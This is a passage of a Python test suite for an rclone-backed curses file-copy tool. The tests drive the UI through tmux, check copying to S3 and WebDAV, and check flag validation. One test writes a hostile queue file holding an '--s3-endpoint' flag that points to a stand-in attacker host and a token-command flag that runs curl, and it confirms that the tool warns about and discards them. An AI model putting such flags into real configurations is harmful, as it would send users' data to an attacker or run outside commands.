        it = m.QueueItem(self.rpath("x"), other + "/x", True, self.spec, self.spec)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(self.rclone("cat", "s3:" + other + "/x/one.txt").decode(), "1")
        inside = m.QueueItem(self.rpath("x"), self.rpath("x", "x"), True, self.spec, self.spec)
        self.run_item(inside)
        self.assertEqual(inside.status, m.STATUS_FAIL)


@unittest.skipUnless("dav" in SERVICES, "needs the rclone-dav service of the Docker rig")
class RcloneNoModtimeTest(RcloneBase):
    REMOTE = "dav"

    def remote_base(self):
        base = "/t" + uuid.uuid4().hex[:12]
        self.rclone("mkdir", "dav:" + base)
        return base

    def test_warned_and_still_copies(self):
        self.assertFalse(self.fs.remote.modtime_ok)
        app = m.App.__new__(m.App)
        app.registry = self.registry
        app.queue = [m.QueueItem("/a", self.rpath("a"), True, None, self.spec)]
        self.assertEqual(app.no_modtime_remotes(), ["rclone:dav"])
        src = self.make_src()
        it = m.QueueItem(src, self.rpath("d"), True, None, self.spec)
        self.run_item(it)
        self.assertEqual(it.status, m.STATUS_OK, it.error_text)
        self.assertEqual(self.cat("d/sub/b.txt"), "sub/b.txt")


@unittest.skipUnless(HAVE_RCLONE and SERVICES and shutil.which("tmux"),
                     "needs the Docker rig with tmux")
class RcloneUiTest(unittest.TestCase):
    """The real curses UI through tmux: connect a pane to rclone, copy,
    and the pane rules."""

    SESSION = "mcrsync-rclone-ui"
    APP = os.path.join(HERE, "..", "mcrsync.py")
    SETTINGS = os.path.expanduser("~/.mcrsync.yaml")

    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="rclone-ui-")
        if os.path.exists(self.SETTINGS):
            os.unlink(self.SETTINGS)

    def tearDown(self):
        subprocess.call(["tmux", "kill-session", "-t", self.SESSION], stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        shutil.rmtree(self.root, ignore_errors=True)

    def start(self, env=""):
        subprocess.check_call(["tmux", "new-session", "-d", "-s", self.SESSION, "-x", "150",
                               "-y", "40", "-c", self.root,
                               "{0} RCLONE_CONFIG={1} python3 {2}; sleep 600".format(
                                   env, os.environ["RCLONE_CONFIG"], self.APP)])
        self.wait_for("SOURCE [")

    def keys(self, *keys, **kw):
        cmd = ["tmux", "send-keys", "-t", self.SESSION]
        if kw.get("literal"):
            cmd += ["-l", "--"]
        subprocess.check_call(cmd + list(keys))
        time.sleep(kw.get("delay", 0.6))

    def screen(self):
        return subprocess.check_output(["tmux", "capture-pane", "-p", "-t", self.SESSION]).decode()

    def wait_for(self, text, timeout=20):
        end = time.time() + timeout
        while time.time() < end:
            s = self.screen()
            if text in s:
                return s
            time.sleep(0.3)
        self.fail("timed out waiting for {0!r}; screen:\n{1}".format(text, self.screen()))

    def test_connect_copy_and_pane_rules(self):
        write(os.path.join(self.root, "photos", "sub", "b.jpg"), "b")
        target = os.path.join(self.root, "target")
        os.makedirs(target)
        with open(self.SETTINGS, "w") as f:
            f.write('last_rclone:\n  remote: "loc"\n  path: "{0}"\n'.format(target))
        self.start()
        self.keys("Tab")
        self.keys("o")
        self.wait_for("Connect this pane to:")
        self.keys("Down")
        self.keys("Enter")
        s = self.wait_for("Remote (names with other characters")
        self.assertNotIn("with space:", s)
        self.keys("Enter")          # the remembered remote is preselected
        self.wait_for("Start path")
        self.keys("Enter")          # remembered path
        self.wait_for("TARGET [rclone loc]")
        self.assertIn("loc:" + target, self.screen())
        # SSH can't be opposite an rclone pane: no chooser, straight to rclone
        self.keys("Tab")
        self.keys("o")
        self.wait_for("Connect SOURCE pane to rclone")
        self.keys("Escape")
        self.keys("c")              # photos (target is the other folder)
        self.keys("F8")
        s = self.wait_for("RUN OPTIONS")
        self.assertIn("rclone flags (1 item)", s)
        self.assertNotIn("rsync flags", s)
        self.assertIn("rclone copy --ask-password=false --update --use-json-log", s)
        self.assertIn("-l/--links is left out", s)
        self.keys("Enter")
        self.wait_for("[SYNCED OK]")
        self.assertEqual(read(os.path.join(target, "photos", "sub", "b.jpg")), "b")
        with open(self.SETTINGS) as f:
            saved = f.read()
        self.assertIn('remote: "loc"', saved)
        self.assertIn('kind: "rclone"', saved)

    def test_flag_problems_refused_in_editor(self):
        write(os.path.join(self.root, "photos", "a.jpg"), "a")
        with open(self.SETTINGS, "w") as f:
            f.write('last_rclone:\n  remote: "loc"\n  path: "{0}"\n'.format(self.root))
        self.start()
        self.keys("Tab")
        self.keys("o")
        self.wait_for("Connect this pane to:")
        self.keys("Down")
        self.keys("Enter")
        self.keys("Enter")
        self.keys("Enter")
        self.wait_for("TARGET [rclone loc]")
        self.keys("Tab")
        self.keys("c")
        self.keys("F8")
        self.wait_for("RUN OPTIONS")
        self.keys("e")
        self.wait_for("rclone flags:")
        self.keys(" -v", literal=True)
        self.keys("Enter")
        self.wait_for("keeping previous options")
        self.keys("Enter")
        self.keys("e")
        self.wait_for("rclone flags:")
        self.keys(" --delete", literal=True)
        self.keys("Enter")
        s = self.wait_for("makes folder items run 'rclone sync'")
        self.assertIn("rclone sync --ask-password=false --update", s)
        self.assertIn("CAUTION", s)

    def test_malicious_queue_file(self):
        """Flags from a queue file that would send data elsewhere or run a
        command are shown and marked before anything is used."""
        queue = os.path.join(self.root, "evil.json")
        with open(queue, "w") as f:
            json.dump({"rclone_opts": ["--update", "--s3-endpoint=http://evil.example",
                                       "--webdav-bearer-token-command=curl evil"],
                       "items": [{"src": self.root, "dst": "/bkt/x",
                                  "dst_conn": {"type": "rclone", "remote": "loc"}}]}, f)
        self.start()
        self.keys("l")
        self.wait_for("Load queue from")
        self.keys("C-u")
        self.keys(queue, literal=True)
        self.keys("Enter")
        s = self.wait_for("Use these flags?")
        self.assertIn("CHECK - mcrsync", s)
        self.assertIn("WARNING - these", s)
        self.keys("n")
        self.wait_for("Loaded 1 item(s)")
        self.keys("Enter")
        self.keys("F8")
        s = self.wait_for("RUN OPTIONS")
        self.assertNotIn("evil", s)

    def test_busy_spinner(self):
        """A slow listing shows '[ / working ]' at the right end of the
        QUEUE box's top border, beside its title; the border comes back
        afterwards."""
        wrap = os.path.join(self.root, "slow-bin")
        os.makedirs(wrap)
        with open(os.path.join(wrap, "rclone"), "w") as f:
            f.write('#!/bin/sh\n[ "$1" = lsjson ] && sleep 2\nexec {0} "$@"\n'.format(
                shutil.which("rclone")))
        os.chmod(os.path.join(wrap, "rclone"), 0o755)
        os.makedirs(os.path.join(self.root, "remote", "slow"))
        with open(self.SETTINGS, "w") as f:
            f.write('last_rclone:\n  remote: "loc"\n  path: "{0}"\n'.format(
                os.path.join(self.root, "remote")))
        self.start("PATH={0}:$PATH".format(wrap))
        self.keys("Tab")
        self.keys("o")
        self.wait_for("Connect this pane to:")
        self.keys("Down")
        self.keys("Enter")
        self.wait_for("Remote (names with other characters", timeout=30)
        self.keys("Enter")
        self.wait_for("Start path", timeout=30)
        self.keys("Enter")
        self.wait_for("TARGET [rclone loc]", timeout=30)
        # (tmux's status line makes the screen one row shorter than asked)
        corner_row = [i for i, l in enumerate(self.screen().split("\n"))
                      if " QUEUE (last 5)" in l][0]

        def border():
            lines = self.screen().split("\n")
            return lines[corner_row] if len(lines) > corner_row else ""

        normal = border()
        self.assertNotIn("working", normal)
        self.keys("Right", delay=0)     # enter 'slow': 2s listing
        frames = set()
        end = time.time() + 3
        while time.time() < end:
            line = border()
            if line.endswith(" working ]"):
                self.assertIn(" QUEUE (last 5)", line)      # title untouched
                frames.add(line[-len("/ working ]")])
            time.sleep(0.1)
        self.assertGreater(len(frames & set(m.BusyIndicator.FRAMES)), 1,
                           "no turning spinner seen: {0}".format(frames))
        self.wait_for(os.path.join(self.root, "remote", "slow"))
        time.sleep(0.5)
        self.assertEqual(border(), normal)
